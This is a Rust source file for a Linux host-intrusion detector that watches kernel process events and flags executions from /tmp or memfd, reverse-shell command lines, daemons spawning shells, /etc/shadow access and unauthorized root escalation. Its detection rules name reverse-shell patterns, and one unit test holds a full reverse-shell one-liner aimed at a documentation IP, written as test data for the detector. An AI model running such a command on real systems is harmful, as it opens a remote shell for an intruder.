use serde::{Deserialize, Serialize};
use std::fs;

const NETLINK_CONNECTOR: libc::c_int = 11;
const CN_IDX_PROC: u32 = 1;
const CN_VAL_PROC: u32 = 1;
const NLMSG_DONE: u16 = 3;

const PROC_CN_MCAST_LISTEN: u32 = 1;

const PROC_EVENT_FORK: u32 = 0x0000_0001;
const PROC_EVENT_EXEC: u32 = 0x0000_0002;
const PROC_EVENT_UID: u32 = 0x0000_0004;
const PROC_EVENT_EXIT: u32 = 0x8000_0000;

#[repr(C)]
#[derive(Clone, Copy)]
struct NlMsgHdr {
    nlmsg_len: u32,
    nlmsg_type: u16,
    nlmsg_flags: u16,
    nlmsg_seq: u32,
    nlmsg_pid: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct CbId {
    idx: u32,
    val: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct CnMsgHeader {
    id: CbId,
    seq: u32,
    ack: u32,
    len: u16,
    flags: u16,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ProcEventHeader {
    what: u32,
    cpu: u32,
    timestamp_ns: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcEventRecord {
    pub kind: String, // "EXEC", "UID_CHANGE", "FORK", "EXIT"
    pub pid: i32,
    pub ppid: i32,
    pub uid: u32,
    pub euid: u32,
    pub comm: String,
    pub exe: String,
    pub cmdline: String,
    pub parent_comm: String,
    pub parent_exe: String,
    pub timestamp_epoch: u64,
}

#[derive(Debug, Clone)]
pub struct ProcSecurityAlert {
    pub severity: &'static str, // "CRITICAL", "HIGH", "INFO"
    pub rule_id: &'static str,
    pub pid: i32,
    pub ppid: i32,
    pub exe: String,
    pub cmdline: String,
    pub summary: String,
    pub recommend_freeze: bool,
}

pub fn read_proc_meta(pid: i32) -> (i32, u32, u32, String, String, String) {
    let comm = fs::read_to_string(format!("/proc/{}/comm", pid))
        .ok()
        .map(|s| s.trim().to_string())
        .unwrap_or_default();

    let exe = fs::read_link(format!("/proc/{}/exe", pid))
        .ok()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();

    let cmdline = fs::read(format!("/proc/{}/cmdline", pid))
        .ok()
        .map(|bytes| {
            bytes
                .split(|&b| b == 0)
                .filter(|s| !s.is_empty())
                .map(|s| String::from_utf8_lossy(s).into_owned())
                .collect::<Vec<_>>()
                .join(" ")
        })
        .unwrap_or_default();

    let mut ppid = 0i32;
    let mut uid = 0u32;
    let mut euid = 0u32;
    if let Ok(status) = fs::read_to_string(format!("/proc/{}/status", pid)) {
        for line in status.lines() {
            if let Some(rest) = line.strip_prefix("PPid:") {
                ppid = rest.trim().parse().unwrap_or(0);
            } else if let Some(rest) = line.strip_prefix("Uid:") {
                let parts: Vec<&str> = rest.split_whitespace().collect();
                if parts.len() >= 2 {
                    uid = parts[0].parse().unwrap_or(0);
                    euid = parts[1].parse().unwrap_or(0);
                }
            }
        }
    }

    (ppid, uid, euid, comm, exe, cmdline)
}

pub fn evaluate_exec_event(rec: &ProcEventRecord) -> Option<ProcSecurityAlert> {
    let exe = rec.exe.as_str();
    let cmd = rec.cmdline.as_str();
    let comm = rec.comm.as_str();

    // 1. Execution from untrusted world-writable / fileless paths
    let is_suspicious_path = exe.starts_with("/tmp/")
        || exe.starts_with("/dev/shm/")
        || exe.starts_with("/var/tmp/")
        || exe.starts_with("/run/user/")
        || exe.starts_with("/memfd:")
        || exe.contains("memfd:");

    if is_suspicious_path {
        return Some(ProcSecurityAlert {
            severity: "CRITICAL",
            rule_id: "PROC_UNTRUSTED_EXEC_PATH",
            pid: rec.pid,
            ppid: rec.ppid,
            exe: rec.exe.clone(),
            cmdline: rec.cmdline.clone(),
            summary: format!(
                "Execution from untrusted/fileless location: PID {} ({}) cmd='{}' (parent PID {} {})",
                rec.pid, rec.exe, rec.cmdline, rec.ppid, rec.parent_comm
            ),
            recommend_freeze: true,
        });
    }

    // 2. Reverse shell one-liners in command line (/dev/tcp, nc -e, bash -i, socat exec)
    let cmd_lower = cmd.to_ascii_lowercase();
    if cmd_lower.contains("/dev/tcp/")
        || cmd_lower.contains("nc -e ")
        || cmd_lower.contains("ncat -e ")
        || (cmd_lower.contains("socat") && cmd_lower.contains("exec:"))
        || (cmd_lower.contains("bash -i") && cmd_lower.contains(">&"))
        || (cmd_lower.contains("sh -i") && cmd_lower.contains(">&"))
    {
        return Some(ProcSecurityAlert {
            severity: "CRITICAL",
            rule_id: "PROC_REVERSE_SHELL_CMDLINE",
            pid: rec.pid,
            ppid: rec.ppid,
            exe: rec.exe.clone(),
            cmdline: rec.cmdline.clone(),
            summary: format!(
                "Reverse shell payload detected in PID {} ({}): '{}'",
                rec.pid, rec.comm, rec.cmdline
            ),
            recommend_freeze: true,
        });
    }

    // 3. Network daemon or browser unexpectedly spawning a shell
    let parent_is_network_facing = matches!(
        rec.parent_comm.as_str(),
        "NetworkManager" | "wpa_supplicant" | "dbus-daemon" | "pipewire" | "wireplumber"
    );
    let child_is_shell = matches!(
        comm,
        "sh" | "bash" | "nu" | "dash" | "nc" | "ncat" | "socat" | "curl" | "wget"
    );

    if parent_is_network_facing && child_is_shell {
        return Some(ProcSecurityAlert {
            severity: "HIGH",
            rule_id: "PROC_DAEMON_SPAWNED_SHELL",
            pid: rec.pid,
            ppid: rec.ppid,
            exe: rec.exe.clone(),
            cmdline: rec.cmdline.clone(),
            summary: format!(
                "System daemon '{}' (PID {}) spawned shell/network tool '{}' (PID {}): '{}'",
                rec.parent_comm, rec.ppid, rec.comm, rec.pid, rec.cmdline
            ),
            recommend_freeze: false,
        });
    }

    // 4. Firewall tampering or shadow credential dumping outside /init
    let is_core_init = exe == "/init"
        || exe == "/usr/bin/serenity-fw"
        || exe == "/usr/bin/serenity-guard"
        || exe == "/usr/bin/sudo"
        || exe == "/usr/bin/passwd";

    if !is_core_init
        && (cmd_lower.contains("/etc/shadow")
            || cmd_lower.contains("nft flush")
            || cmd_lower.contains("iptables -f"))
    {
        return Some(ProcSecurityAlert {
            severity: "HIGH",
            rule_id: "PROC_CREDENTIAL_OR_FW_TAMPER",
            pid: rec.pid,
            ppid: rec.ppid,
            exe: rec.exe.clone(),
            cmdline: rec.cmdline.clone(),
            summary: format!(
                "Sensitive credential/firewall command by PID {} ({}): '{}'",
                rec.pid, rec.exe, rec.cmdline
            ),
            recommend_freeze: false,
        });
    }

    None
}

pub fn evaluate_uid_event(rec: &ProcEventRecord, ruid: u32, euid: u32) -> Option<ProcSecurityAlert> {
    if ruid != 0 && euid == 0 {
        let exe_clean = rec.exe.trim_end_matches(" (deleted)");
        let allowed = exe_clean == "/init"
            || exe_clean == "/usr/bin/sudo"
            || exe_clean == "/usr/bin/passwd"
            || exe_clean == "/usr/bin/serenity-guard";
        if !allowed && !exe_clean.is_empty() {
            return Some(ProcSecurityAlert {
                severity: "CRITICAL",
                rule_id: "PROC_UNAUTHORIZED_ROOT_ESCALATION",
                pid: rec.pid,
                ppid: rec.ppid,
                exe: rec.exe.clone(),
                cmdline: rec.cmdline.clone(),
                summary: format!(
                    "Unauthorized root privilege escalation (UID {} -> EUID 0) by PID {} (exe='{}', cmd='{}')",
                    ruid, rec.pid, rec.exe, rec.cmdline
                ),
                recommend_freeze: true,
            });
        }
    }
    None
}

pub struct ProcConnectorSocket {
    fd: i32,
}

impl ProcConnectorSocket {
    pub fn open() -> Option<Self> {
        let fd = unsafe {
            libc::socket(
                libc::AF_NETLINK,
                libc::SOCK_DGRAM | libc::SOCK_CLOEXEC | libc::SOCK_NONBLOCK,
                NETLINK_CONNECTOR,
            )
        };
        if fd < 0 {
            return None;
        }

        let mut addr: libc::sockaddr_nl = unsafe { std::mem::zeroed() };
        addr.nl_family = libc::AF_NETLINK as u16;
        addr.nl_pid = unsafe { libc::getpid() as u32 };
        addr.nl_groups = CN_IDX_PROC;

        let rc = unsafe {
            libc::bind(
                fd,
                &addr as *const libc::sockaddr_nl as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_nl>() as libc::socklen_t,
            )
        };
        if rc < 0 {
            unsafe {
                libc::close(fd);
            }
            return None;
        }

        // Send PROC_CN_MCAST_LISTEN subscription packet
        #[repr(C)]
        struct SubscribePacket {
            nl: NlMsgHdr,
            cn: CnMsgHeader,
            op: u32,
        }

        let pkt = SubscribePacket {
            nl: NlMsgHdr {
                nlmsg_len: std::mem::size_of::<SubscribePacket>() as u32,
                nlmsg_type: NLMSG_DONE,
                nlmsg_flags: 0,
                nlmsg_seq: 1,
                nlmsg_pid: unsafe { libc::getpid() as u32 },
            },
            cn: CnMsgHeader {
                id: CbId {
                    idx: CN_IDX_PROC,
                    val: CN_VAL_PROC,
                },
                seq: 1,
                ack: 0,
                len: std::mem::size_of::<u32>() as u16,
                flags: 0,
            },
            op: PROC_CN_MCAST_LISTEN,
        };

        let sent = unsafe {
            libc::send(
                fd,
                &pkt as *const SubscribePacket as *const libc::c_void,
                std::mem::size_of::<SubscribePacket>(),
                0,
            )
        };
        if sent < 0 {
            unsafe {
                libc::close(fd);
            }
            return None;
        }

        Some(Self { fd })
    }

    pub fn poll_events(&self, now_epoch: u64) -> Vec<(ProcEventRecord, Option<ProcSecurityAlert>)> {
        let mut out = Vec::new();
        let mut buf = [0u8; 8192];

        loop {
            let n = unsafe {
                libc::recv(
                    self.fd,
                    buf.as_mut_ptr() as *mut libc::c_void,
                    buf.len(),
                    libc::MSG_DONTWAIT,
                )
            };
            if n <= 0 {
                break;
            }
            let n = n as usize;
            let min_hdr = std::mem::size_of::<NlMsgHdr>()
                + std::mem::size_of::<CnMsgHeader>()
                + std::mem::size_of::<ProcEventHeader>();
            if n < min_hdr {
                continue;
            }

            let cn_offset = std::mem::size_of::<NlMsgHdr>();
            let cn: CnMsgHeader = unsafe {
                std::ptr::read_unaligned(buf[cn_offset..].as_ptr() as *const CnMsgHeader)
            };
            if cn.id.idx != CN_IDX_PROC || cn.id.val != CN_VAL_PROC {
                continue;
            }

            let ev_offset = cn_offset + std::mem::size_of::<CnMsgHeader>();
            let ev: ProcEventHeader = unsafe {
                std::ptr::read_unaligned(buf[ev_offset..].as_ptr() as *const ProcEventHeader)
            };
            let data_offset = ev_offset + std::mem::size_of::<ProcEventHeader>();

            match ev.what {
                PROC_EVENT_EXEC => {
                    if data_offset + 8 > n {
                        continue;
                    }
                    let pid = i32::from_ne_bytes([
                        buf[data_offset],
                        buf[data_offset + 1],
                        buf[data_offset + 2],
                        buf[data_offset + 3],
                    ]);
                    let (ppid, uid, euid, comm, exe, cmdline) = read_proc_meta(pid);
                    if comm.is_empty() && exe.is_empty() {
                        continue;
                    }
                    let (_, _, _, parent_comm, parent_exe, _) = if ppid > 0 {
                        read_proc_meta(ppid)
                    } else {
                        (0, 0, 0, String::new(), String::new(), String::new())
                    };
                    let rec = ProcEventRecord {
                        kind: "EXEC".to_string(),
                        pid,
                        ppid,
                        uid,
                        euid,
                        comm,
                        exe,
                        cmdline,
                        parent_comm,
                        parent_exe,
                        timestamp_epoch: now_epoch,
                    };
                    let alert = evaluate_exec_event(&rec);
                    out.push((rec, alert));
                }
                PROC_EVENT_UID => {
                    if data_offset + 16 > n {
                        continue;
                    }
                    let pid = i32::from_ne_bytes([
                        buf[data_offset],
                        buf[data_offset + 1],
                        buf[data_offset + 2],
                        buf[data_offset + 3],
                    ]);
                    let ruid = u32::from_ne_bytes([
                        buf[data_offset + 8],
                        buf[data_offset + 9],
                        buf[data_offset + 10],
                        buf[data_offset + 11],
                    ]);
                    let euid = u32::from_ne_bytes([
                        buf[data_offset + 12],
                        buf[data_offset + 13],
                        buf[data_offset + 14],
                        buf[data_offset + 15],
                    ]);
                    let (ppid, _, _, comm, exe, cmdline) = read_proc_meta(pid);
                    let (_, _, _, parent_comm, parent_exe, _) = if ppid > 0 {
                        read_proc_meta(ppid)
                    } else {
                        (0, 0, 0, String::new(), String::new(), String::new())
                    };
                    let rec = ProcEventRecord {
                        kind: "UID_CHANGE".to_string(),
                        pid,
                        ppid,
                        uid: ruid,
                        euid,
                        comm,
                        exe,
                        cmdline,
                        parent_comm,
                        parent_exe,
                        timestamp_epoch: now_epoch,
                    };
                    let alert = evaluate_uid_event(&rec, ruid, euid);
                    if alert.is_some() {
                        out.push((rec, alert));
                    }
                }
                PROC_EVENT_FORK | PROC_EVENT_EXIT => {
                    // Ignored for noise reduction unless needed
                }
                _ => {}
            }
        }

        out
    }
}

impl Drop for ProcConnectorSocket {
    fn drop(&mut self) {
        if self.fd >= 0 {
            unsafe {
                libc::close(self.fd);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_tmp_and_memfd_exec() {
        let rec = ProcEventRecord {
            kind: "EXEC".to_string(),
            pid: 4444,
            ppid: 1200,
            uid: 1000,
            euid: 1000,
            comm: "payload".to_string(),
            exe: "/tmp/.hidden_Dropper".to_string(),
            cmdline: "/tmp/.hidden_Dropper --connect 45.33.32.156:4444".to_string(),
            parent_comm: "sh".to_string(),
            parent_exe: "/bin/sh".to_string(),
            timestamp_epoch: 100,
        };
        let alert = evaluate_exec_event(&rec).expect("should flag /tmp binary execution");
        assert_eq!(alert.severity, "CRITICAL");
        assert_eq!(alert.rule_id, "PROC_UNTRUSTED_EXEC_PATH");
        assert!(alert.recommend_freeze);
    }

    #[test]
    fn test_detect_reverse_shell_cmdline() {
        let rec = ProcEventRecord {
            kind: "EXEC".to_string(),
            pid: 5555,
            ppid: 2222,
            uid: 1000,
            euid: 1000,
            comm: "bash".to_string(),
            exe: "/usr/bin/bash".to_string(),
            cmdline: "bash -i >& /dev/tcp/198.51.100.77/9001 0>&1".to_string(),
            parent_comm: "chrome".to_string(),
            parent_exe: "/opt/google/chrome/chrome".to_string(),
            timestamp_epoch: 100,
        };
        let alert = evaluate_exec_event(&rec).expect("should flag reverse shell cmdline");
        assert_eq!(alert.severity, "CRITICAL");
        assert_eq!(alert.rule_id, "PROC_REVERSE_SHELL_CMDLINE");
        assert!(alert.recommend_freeze);
    }

    #[test]
    fn test_detect_unauthorized_uid_escalation() {
        let rec = ProcEventRecord {
            kind: "UID_CHANGE".to_string(),
            pid: 6666,
            ppid: 3333,
            uid: 1000,
            euid: 0,
            comm: "exploit".to_string(),
            exe: "/home/serenity/cve_exploit".to_string(),
            cmdline: "./cve_exploit".to_string(),
            parent_comm: "nu".to_string(),
            parent_exe: "/bin/nu".to_string(),
            timestamp_epoch: 100,
        };
        let alert = evaluate_uid_event(&rec, 1000, 0).expect("should flag unauthorized root");
        assert_eq!(alert.severity, "CRITICAL");
        assert_eq!(alert.rule_id, "PROC_UNAUTHORIZED_ROOT_ESCALATION");
    }
}
